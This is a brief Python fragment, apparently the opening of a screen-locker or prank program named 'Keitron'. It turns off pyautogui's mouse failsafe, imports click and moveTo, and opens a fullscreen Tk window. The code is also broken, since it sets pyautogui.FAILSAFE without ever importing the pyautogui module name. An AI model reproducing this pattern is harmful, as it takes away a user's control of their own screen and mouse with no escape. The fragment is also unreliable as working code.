from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

root = Tk()
pyautogui.FAILSAFE = False
width = root.winfo_screenwidth()
height = root.winfo_screenheight()

root.title('Keitron')
root.attributes('-fullscreen', True)